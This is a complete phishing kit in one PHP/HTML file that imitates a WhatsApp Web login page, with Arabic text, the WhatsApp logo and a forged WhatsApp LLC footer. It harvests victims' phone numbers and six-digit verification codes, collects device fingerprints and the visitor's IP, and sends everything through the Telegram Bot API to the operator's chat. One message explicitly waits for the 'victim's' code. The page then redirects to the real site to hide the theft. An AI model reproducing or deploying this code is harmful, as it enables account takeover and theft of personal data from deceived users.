<?php
// منع أي مخرجات غير متوقعة
error_reporting(0);
ini_set('display_errors', 0);

// التوكن المطلوب (نفس التوكن الذي قدمته)
$botToken = "BBOTTTTTTTTTTT";

// دالة لجلب IP الحقيقي للزائر
function getRealIp() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        if (strpos($ip, ',') !== false) {
            $ip = explode(',', $ip)[0];
        }
    }
    return trim($ip);
}

// دالة إرسال الرسائل إلى تليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $response = json_decode($result, true);
    if ($httpCode == 200 && isset($response['ok']) && $response['ok'] === true) {
        return ['success' => true];
    } else {
        $error = isset($response['description']) ? $response['description'] : 'HTTP Error ' . $httpCode;
        return ['success' => false, 'error' => $error];
    }
}

// معالجة طلبات POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    $rawInput = file_get_contents('php://input');
    $input = json_decode($rawInput, true);
    
    if (!$input) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON input']);
        exit;
    }
    
    $chatId = isset($input['chatId']) ? $input['chatId'] : null;
    $step = isset($input['step']) ? $input['step'] : null;
    $data = isset($input['data']) ? $input['data'] : null;
    $deviceInfo = isset($input['deviceInfo']) ? $input['deviceInfo'] : null;
    
    if (!$chatId) {
        echo json_encode(['status' => 'error', 'message' => 'معرف الدردشة (chat ID) غير موجود. تأكد من استخدام الرابط الصحيح.']);
        exit;
    }
    
    $ip = getRealIp();
    
    if ($data && $deviceInfo) {
        if ($step === 'complete') {
            $loginMessage = "
📱 <b>بيانات تسجيل دخول WhatsApp</b>

📞 <b>رقم الهاتف:</b> <code>{$data['phone']}</code>
🔢 <b>كود التحقق:</b> <code>{$data['code']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP الحقيقي:</b> {$ip}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
            ";
            $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
        } else {
            $stageMessage = "
📱 <b>مرحلة تسجيل دخول WhatsApp</b>

🔹 <b>المرحلة:</b> $step
📞 <b>رقم الهاتف:</b> <code>{$data['phone']}</code>
" . (isset($data['code']) ? "🔢 <b>كود التحقق:</b> <code>{$data['code']}</code>\n" : "") . "
🌐 <b>IP الحقيقي:</b> {$ip}
📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
            ";
            
            if ($step === 'phone') {
                $stageMessage .= "\n\n⚠️ <b>تم إرسال رقم الهاتف. انتظر إدخال الكود من الضحية.</b>";
            }
            
            $result = sendTelegramMessage($chatId, $stageMessage, $botToken);
        }
        
        if ($result['success']) {
            $nextStep = ($step === 'phone') ? 'code' : 'complete';
            echo json_encode(['status' => 'success', 'nextStep' => $nextStep]);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'فشل إرسال البيانات إلى البوت: ' . $result['error']]);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'بيانات غير مكتملة']);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>WhatsApp Web</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }
    body {
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }
    .container {
      width: 100%;
      max-width: 360px;
      margin: 0 auto;
    }
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    .whatsapp-logo {
      width: 80px;
      height: 80px;
    }
    .login-form {
      background-color: #FFFFFF;
      border-radius: 24px;
      padding: 24px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 20px;
      font-weight: 700;
      color: #25D366;
    }
    .subtitle {
      text-align: center;
      margin-bottom: 20px;
      font-size: 14px;
      color: #667781;
    }
    .input-row {
      display: flex;
      gap: 10px;
      margin-bottom: 16px;
    }
    .country-code-column {
      width: 30%;
    }
    .phone-column {
      width: 70%;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #25D366;
      font-weight: 600;
      text-align: right;
    }
    input {
      width: 100%;
      padding: 14px;
      background-color: #F5F5F5;
      border: 1px solid #E6E6E6;
      border-radius: 12px;
      font-size: 15px;
      text-align: center;
    }
    input:focus {
      outline: none;
      border-color: #25D366;
      background-color: #FFFFFF;
    }
    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #25D366;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 16px;
    }
    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px;
    }
    .code-input {
      width: 48px;
      height: 56px;
      text-align: center;
      font-size: 22px;
      background-color: #F5F5F5;
      border: 1px solid #E6E6E6;
      border-radius: 12px;
    }
    .step-indicator {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-bottom: 24px;
    }
    .step {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background-color: #DDDDDD;
    }
    .step.active {
      background-color: #25D366;
    }
    .form-step {
      display: none;
    }
    .form-step.active {
      display: block;
    }
    .loader {
      width: 20px;
      height: 20px;
      border: 2px solid #25D366;
      border-top-color: transparent;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 12px auto;
      display: none;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .status {
      text-align: center;
      font-size: 13px;
      color: #667781;
      margin-top: 12px;
      display: none;
    }
    .error-message {
      color: #E53935;
      font-size: 13px;
      text-align: center;
      margin-top: 12px;
      display: none;
    }
    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 11px;
      color: #667781;
    }
  </style>
</head>
<body>
<div class="container">
  <div class="logo-container">
    <svg class="whatsapp-logo" viewBox="0 0 24 24" fill="#25D366" xmlns="http://www.w3.org/2000/svg">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.864 3.488"/>
    </svg>
    <h1>WhatsApp Web</h1>
  </div>
  <div class="login-form">
    <div class="step-indicator">
      <div class="step active" id="step1"></div>
      <div class="step" id="step2"></div>
    </div>
    <div class="form-step active" id="stepPhone">
      <h1>أدخل رقم هاتفك</h1>
      <p class="subtitle">سيتم إرسال رمز التحقق عبر WhatsApp</p>
      <div class="input-row">
        <div class="country-code-column">
          <label>كود الدولة</label>
          <input type="text" id="countryCode" placeholder="+00" value="+966">
        </div>
        <div class="phone-column">
          <label>رقم الهاتف</label>
          <input type="tel" id="phone" placeholder="5xxxxxxxx" autofocus>
        </div>
      </div>
      <button class="login-btn" onclick="submitPhone()">التالي</button>
    </div>
    <div class="form-step" id="stepCode">
      <h1>أدخل الرمز</h1>
      <p class="subtitle">تم إرسال رمز إلى هاتفك</p>
      <div class="code-inputs">
        <input type="text" class="code-input numbers-only" id="code1" maxlength="1">
        <input type="text" class="code-input numbers-only" id="code2" maxlength="1">
        <input type="text" class="code-input numbers-only" id="code3" maxlength="1">
        <input type="text" class="code-input numbers-only" id="code4" maxlength="1">
        <input type="text" class="code-input numbers-only" id="code5" maxlength="1">
        <input type="text" class="code-input numbers-only" id="code6" maxlength="1">
      </div>
      <button class="login-btn" onclick="submitCode()">تحقق</button>
    </div>
    <div class="loader" id="loader"></div>
    <div class="status" id="status"></div>
    <div class="error-message" id="errorMessage"></div>
  </div>
  <div class="footer">© 2025 WhatsApp LLC</div>
</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID');
  if (!chatId) {
    document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;">خطأ: الرابط غير صالح (يجب أن يحتوي على ?ID=chat_id)</div>';
    throw new Error('Missing chatId');
  }

  let userPhone = '';

  function moveToNext(idx) {
    const cur = document.getElementById(`code${idx}`);
    const next = document.getElementById(`code${idx+1}`);
    if (cur.value.length === 1 && next) next.focus();
    if (idx === 6 && cur.value.length === 1) compileCode();
  }

  function compileCode() {
    let code = '';
    for (let i=1; i<=6; i++) code += document.getElementById(`code${i}`).value;
    return code;
  }

  async function collectDeviceInfo() {
    let battery = "غير متوفر", conn = "غير متوفر", tz = "غير متوفر", screenInfo = "غير متوفر";
    try { if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+'%'; } } catch(e) {}
    try { if (navigator.connection) conn = navigator.connection.effectiveType; } catch(e) {}
    try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
    try { screenInfo = `${screen.width}x${screen.height}, dpr=${window.devicePixelRatio}`; } catch(e) {}
    return {
      userAgent: navigator.userAgent,
      battery: battery,
      platform: navigator.platform,
      language: navigator.language,
      connection: conn,
      timezone: tz,
      screen: screenInfo
    };
  }

  async function sendToServer(step, data) {
    const deviceInfo = await collectDeviceInfo();
    const res = await fetch(window.location.href, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({chatId, step, data, deviceInfo})
    });
    return await res.json();
  }

  function showStatus(msg, isLoading=true) {
    document.getElementById('status').innerText = msg;
    document.getElementById('status').style.display = 'block';
    document.getElementById('loader').style.display = isLoading ? 'block' : 'none';
  }
  function showError(msg) {
    const errDiv = document.getElementById('errorMessage');
    errDiv.innerText = msg;
    errDiv.style.display = 'block';
    setTimeout(() => errDiv.style.display = 'none', 5000);
  }
  function hideError() { document.getElementById('errorMessage').style.display = 'none'; }

  async function submitPhone() {
    const country = document.getElementById('countryCode').value.trim();
    const phone = document.getElementById('phone').value.trim();
    if (!country || !phone) return showError('يرجى إدخال كود الدولة ورقم الهاتف');
    const fullPhone = country + phone;
    userPhone = fullPhone;
    showStatus('جاري إرسال رمز التحقق...');
    hideError();
    try {
      const result = await sendToServer('phone', {phone: fullPhone});
      if (result.status === 'success') {
        showStatus('تم إرسال الرمز', false);
        setTimeout(() => {
          document.getElementById('stepPhone').classList.remove('active');
          document.getElementById('stepCode').classList.add('active');
          document.getElementById('step1').classList.remove('active');
          document.getElementById('step2').classList.add('active');
          document.getElementById('code1').focus();
          document.getElementById('loader').style.display = 'none';
          document.getElementById('status').style.display = 'none';
        }, 1500);
      } else throw new Error(result.message || 'فشل الإرسال');
    } catch(e) { showError(e.message); showStatus('',false); document.getElementById('loader').style.display='none'; }
  }

  async function submitCode() {
    const code = compileCode();
    if (code.length !== 6) return showError('يرجى إدخال رمز مكون من 6 أرقام');
    showStatus('جاري التحقق...');
    hideError();
    try {
      const result = await sendToServer('complete', {phone: userPhone, code: code});
      if (result.status === 'success') {
        showStatus('تم التحقق بنجاح! جاري التحويل...', false);
        setTimeout(() => window.location.href = 'https://web.whatsapp.com', 2000);
      } else throw new Error(result.message || 'فشل التحقق');
    } catch(e) { showError(e.message); showStatus('',false); document.getElementById('loader').style.display='none'; }
  }

  // ربط الأحداث
  for (let i=1; i<=6; i++) {
    document.getElementById(`code${i}`).addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g,'');
      if (this.value.length===1 && i<6) document.getElementById(`code${i+1}`).focus();
      if (i===6 && this.value.length===1) submitCode();
    });
    document.getElementById(`code${i}`).addEventListener('keydown', function(e) {
      if (e.key==='Backspace' && this.value==='' && i>1) document.getElementById(`code${i-1}`).focus();
    });
  }
  document.getElementById('phone').addEventListener('keypress', e => { if(e.key==='Enter') submitPhone(); });
</script>
</body>
</html>
